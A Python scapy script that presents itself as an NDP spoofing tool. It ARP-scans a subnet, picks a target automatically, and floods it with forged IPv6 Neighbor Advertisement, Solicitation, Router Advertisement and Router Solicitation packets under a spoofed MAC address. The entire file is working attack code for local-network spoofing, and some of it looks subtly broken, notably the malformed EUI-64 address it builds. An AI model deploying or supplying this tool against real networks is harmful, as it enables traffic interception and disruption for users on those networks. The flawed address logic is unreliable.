import argparse
import time
from threading import Thread
from termcolor import colored
from scapy.all import *

def get_ipv6_from_mac(mac_address, zone_id, prefix_length):
    """Generate an IPv6 address from the MAC address using the EUI-64 format."""
    mac_parts = mac_address.split(":")
    mac_parts[0] = hex(int(mac_parts[0], 16) ^ 0x02)[2:].zfill(2)  # Flip the 7th bit (Universal/Local bit)
    eui64_mac = ":".join(mac_parts[0:3]) + ":ff:fe" + ":".join(mac_parts[3:])
    ipv6_address = f"fe80::{eui64_mac}%{zone_id}/{prefix_length}"
    return ipv6_address

def send_ndp_packet(packet_type, src_mac, dst_mac, iface, count, interval, listen, zone_id, prefix_length, src_ipv6, dst_ipv6):
    """Send NDP packets (NA, NS, RA, RS)."""
    if not src_ipv6:
        src_ipv6 = get_ipv6_from_mac(src_mac, zone_id, prefix_length)
    
    if not dst_ipv6:
        dst_ipv6 = f"ff02::1%{zone_id}"  # Default to multicast address if not specified

    # Select packet type
    if packet_type == 'na':
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst=dst_ipv6) / ICMPv6ND_NA(tgt=dst_ipv6, R=1, S=1, O=0) / ICMPv6NDOptDstLLAddr(lladdr=src_mac)
    elif packet_type == 'ns':
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst='ff02::1') / ICMPv6ND_NS(tgt=dst_ipv6) / ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    elif packet_type == 'ra':
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst=dst_ipv6) / ICMPv6ND_RA() / ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    elif packet_type == 'rs':
        packet = Ether(dst=dst_mac, src=src_mac) / IPv6(dst='ff02::2') / ICMPv6ND_RS() / ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    else:
        raise ValueError("Invalid packet type specified. Use 'na', 'ns', 'ra', or 'rs'.")

    # Listen for NA responses if required
    if listen and packet_type == 'ns':
        listener_thread = Thread(target=listen_for_na, args=(dst_ipv6, iface))
        listener_thread.start()

    # Send the packets
    sent_count = 0
    while count == 0 or sent_count < count:
        sendp(packet, iface=iface, verbose=False)
        print(
            colored("Injected Magic Packet ", "yellow") +
            colored(packet_type.upper(), "blue") +
            colored(" for ", "cyan") +
            dst_ipv6 +
            colored(" Spoofing MAC ", "cyan") +
            colored(src_mac, "green") +
            colored(" Over ", "cyan") +
            colored(dst_mac, "red")
        )
        sent_count += 1
        time.sleep(interval)

def listen_for_na(target_ip, iface):
    """Listen for NA (Neighbor Advertisement) responses."""
    def na_response_callback(pkt):
        if ICMPv6ND_NA in pkt and pkt[ICMPv6ND_NA].tgt == target_ip:
            src_mac = pkt[Ether].src
            print(colored(f"Received NA from {src_mac} claiming IP {target_ip}", "yellow"))

    print("Listening for NA responses...")
    sniff(iface=iface, filter="icmp6 and (icmp6[icmp6type] == 136)", prn=na_response_callback, store=0)

def scan_network(network):
    """Scan the network for active IP-MAC pairs."""
    print(f"Scanning network {network} for active IP-MAC pairs...")
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    try:
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    except Exception as e:
        print(colored(f"Error during ARP scan: {str(e)}", "red"))
        answered_list = []
    
    active_devices = []
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        ipv6 = get_ipv6_from_mac(mac, "12", 64)  # Assuming zone_id and prefix_length
        active_devices.append((ip, mac, ipv6))
        
        print(colored(f"IPv4: {ip}", "blue") + ", " + 
              colored(f"MAC: {mac}", "yellow") + ", " + 
              colored(f"IPv6: {ipv6}", "green"))
    
    return active_devices

def main():
    parser = argparse.ArgumentParser(description="NDP Spoofing Tool (Similar to ARP Spoofing)")
    parser.add_argument("--src-mac", required=True, help="Spoofed source MAC address")
    parser.add_argument("--dst-mac", help="Destination MAC address (not required for --scan)")
    parser.add_argument("--src-ipv6", help="Spoofed source IPv6 address")
    parser.add_argument("--dst-ipv6", help="Destination IPv6 address (optional, defaults to ff02::1)")
    parser.add_argument("--iface", required=True, help="Network interface to use")
    parser.add_argument("--count", type=int, default=0, help="Number of packets to send (0 for unlimited)")
    parser.add_argument("--interval", type=float, default=1.0, help="Time interval between packets in seconds")
    parser.add_argument("--packet-type", choices=['na', 'ns', 'ra', 'rs'], help="Type of NDP packet to send (na, ns, ra, rs) (not required for --scan)")
    parser.add_argument("--zone-id", type=str, default="12", help="Zone ID for the target link-local address")
    parser.add_argument("--prefix-length", type=int, default=64, help="Prefix length for the target IPv6 address (e.g., 64 or 128)")
    parser.add_argument("--listen", action='store_true', help="Listen for NA responses to NS packets")
    parser.add_argument("--scan", type=str, help="Scan the specified network (e.g., 192.168.1.0/24) for IP-MAC pairs")

    args = parser.parse_args()

    # Handle --scan
    if args.scan:
        try:
            active_devices = scan_network(args.scan)
            if active_devices:
                target_ip, target_mac, target_ipv6 = active_devices[0]
                print(f"Selected Target IP: {target_ip}, MAC: {target_mac}, IPv6: {target_ipv6}")
                send_ndp_packet('ns', args.src_mac, target_mac, args.iface, args.count, args.interval, args.listen, args.zone_id, args.prefix_length, args.src_ipv6, target_ipv6)
        except Exception as e:
            print(colored(f"Scan Finished", "red"))
    else:
        # Validate if packet type and destination MAC are required
        if not args.dst_mac or not args.packet_type:
            print(colored("Error: --dst-mac and --packet-type are required when not using --scan", "red"))
            return

        send_ndp_packet(args.packet_type, args.src_mac, args.dst_mac, args.iface, args.count, args.interval, args.listen, args.zone_id, args.prefix_length, args.src_ipv6, args.dst_ipv6)

if __name__ == "__main__":
    main()
